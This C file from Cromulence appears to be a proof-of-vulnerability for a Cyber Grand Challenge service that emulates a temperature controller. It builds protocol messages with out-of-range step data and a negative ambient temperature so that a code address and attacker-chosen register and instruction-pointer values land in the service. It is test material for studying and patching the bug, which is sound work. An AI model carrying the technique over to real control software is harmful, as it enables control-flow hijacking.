/*

Author: Steve Wood <swood@cromulence.com>

Copyright (c) 2015 Cromulence LLC

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in
all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
THE SOFTWARE.

*/


#include <libcgc.h>
#include <stdarg.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <stdio.h>
#include <math.h>
#include <malloc.h>
#define MAGIC 0
#define LEN 2
#define CMD 4
#define SUB 6
#define SENSORID 6
#define SENSORADDR 8
#define SENSORCOEF 12
#define SENSORTEMP 16
#define SENSORMSG 20


typedef struct {
	
	unsigned int type;
	unsigned int timeval;
	unsigned int temperature;
} programElementType;


typedef struct { 

unsigned short flag;
unsigned short length;
unsigned short command;
unsigned short number_of_steps;

programElementType elements[13];

unsigned int checkvalue;

} programMessageType;

typedef struct {
	unsigned short flag;
	unsigned short length;
	unsigned short command;
	unsigned short seconds;
	unsigned int checkvalue;
} runMessageType;

typedef struct {
	unsigned short flag;
	unsigned short length;
	unsigned short command;
	unsigned int ambientTemp;
	unsigned int checkvalue;
} __attribute__((packed)) setAmbientTempMessage;


int receive_bytes (int fd, void *buffer, size_t count) 
{
size_t total;
size_t rxbytes;

    total = 0;

    while(total < count)  {

        rxbytes = 0;

        if (receive(fd, buffer+total, count-total, &rxbytes)==0 ) {

            total += rxbytes;

        }
        
        else {

            return(-1);
        }


    }

return 0;

}
void prime_buf(unsigned char *buf){
	memset(buf, 0, 1000);
	unsigned char ok[12] = { 0xa5, 0x5a, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
	memcpy(buf,ok,12);
	return;
}


int write( int fd, void *buffer, size_t count )
{
	size_t written;
    int total_written;
    int retval;

    written = 0;
    total_written = 0;

    while (total_written < count) {
	   retval=transmit(fd, buffer+total_written, count-total_written, &written);

       if (retval != 0)
            return(-1);

       total_written+=written;
    }

	return(count);

}



int check_val(unsigned char *buf,unsigned short size){

	unsigned int tempval = 0;
	for (unsigned short i=0;i<size;++i){
		tempval = (tempval + ( buf[i] * (i+1))) ;	
	}
	return tempval;
}

void send_msg(unsigned char *buf, unsigned short size){

	memcpy(buf+2, &size, sizeof(short int));
	unsigned int checkval = check_val(buf, size);
	memcpy(buf+size, &checkval,sizeof(int));

}


int main(void)
{

programMessageType theMessage;
runMessageType runMessage;

int i;
unsigned int checkval;
size_t size;
unsigned char buf[10000];

int pov_type;
int ip_mask;
int regmask;
int regnum;
int ipvalue;
int regvalue;

	pov_type = 1;
	ip_mask = 0xffffffff;
	regmask = 0x7fffffff;
	regnum = 5;


	if (write(3, &pov_type, sizeof(pov_type)) == -1)
		_terminate(-1);

	if (write(3, &ip_mask, sizeof(ip_mask)) == -1)
		_terminate(-1);

	if (write(3, &regmask, sizeof(regmask)) == -1)
		_terminate(-1);

	if (write(3, &regnum, sizeof(regnum)) == -1)
		_terminate(-1);


	if (receive_bytes(3, &ipvalue, sizeof(ipvalue)) == -1)
		_terminate(-1);

	if (receive_bytes(3, &regvalue, sizeof(regnum)) == -1)
		_terminate(-1);

	prime_buf(buf);

	//send turnon
	//send program
	//send ticktime

	theMessage.flag = 0x5aa5;

	theMessage.length = sizeof(programMessageType) - 4;

	theMessage.command = 0x6;
	theMessage.number_of_steps = 10;

	unsigned int timeval = 100;
	for (i=0;i< 7; ++i) {

		theMessage.elements[i].type = 0xffff;
		theMessage.elements[i].timeval = timeval;
		theMessage.elements[i].temperature = 0xffffffff;

		timeval += 100;
	}

	theMessage.elements[7].type = 0xFFFF;
	theMessage.elements[7].timeval = timeval;
	theMessage.elements[7].temperature = 0x805eae0;
	timeval += 100;

	theMessage.elements[8].type = 0xFFFF;
	theMessage.elements[8].timeval = timeval;
	theMessage.elements[8].temperature = 0x7a;	
	timeval += 100;

	theMessage.elements[9].type = 0xFFFF;
	theMessage.elements[9].timeval = 3900+60;
	theMessage.elements[9].temperature = ipvalue;	


	checkval = 0;
	for (i=0; i < sizeof(programMessageType)-4; ++i)
			checkval = checkval + *((unsigned char *)&theMessage+i)*(i+1);

	theMessage.checkvalue = checkval;


	if (write(STDOUT, (void *)&theMessage, sizeof(programMessageType)) == -1)
		_terminate(-1);


	if ( receive_bytes( STDIN, buf, 12 ) == -1 )
		_terminate(-1);

	// Set ambient temp message
	setAmbientTempMessage setAmbientMessage;
	setAmbientMessage.flag = 0x5aa5;

	setAmbientMessage.length = sizeof(setAmbientMessage) - 4;

	setAmbientMessage.command = 0xc;
	setAmbientMessage.ambientTemp = regvalue | 0x80000000; // Make sure it is negative

	checkval = 0;
	for (i=0; i < sizeof(setAmbientTempMessage)-4; ++i)
			checkval = checkval + *((unsigned char *)&setAmbientMessage+i)*(i+1);
	
	setAmbientMessage.checkvalue = checkval;
	
	if (write(STDOUT, (void *)&setAmbientMessage, sizeof(setAmbientTempMessage)) == -1)
		_terminate(-1);

	if ( receive_bytes( STDIN, buf, 12 ) == -1 )
		_terminate(-1);

	// Run Message
	prime_buf(buf);

	runMessage.flag = 0x5aa5;

	runMessage.length = sizeof(runMessageType) - 4;

	runMessage.command = 0x9;
	runMessage.seconds = 4000+60;

	checkval = 0;
	for (i=0; i < sizeof(runMessageType)-4; ++i)
			checkval = checkval + *((unsigned char *)&runMessage+i)*(i+1);
	
	runMessage.checkvalue = checkval;


	if (write(STDOUT, (void *)&runMessage, sizeof(runMessageType)) == -1)
		_terminate(-1);

	// send a terminate message to the application for the patched CB
	// unsigned char buffer[] = { 0xa5, 0x5a, 0x08, 0x00, 0xff, 0x00, 0x00, 0x00, 0x6c, 0x06, 0x00, 0x00};
	unsigned char buffer[] = { 0xff, 0xff, 0x08, 0x00, 0xff, 0x00, 0x00, 0x00, 0x6c, 0x06, 0x00, 0x00};


	if (write(STDOUT, (void *)buffer, sizeof(buffer)) == -1)
		_terminate(-1);



}
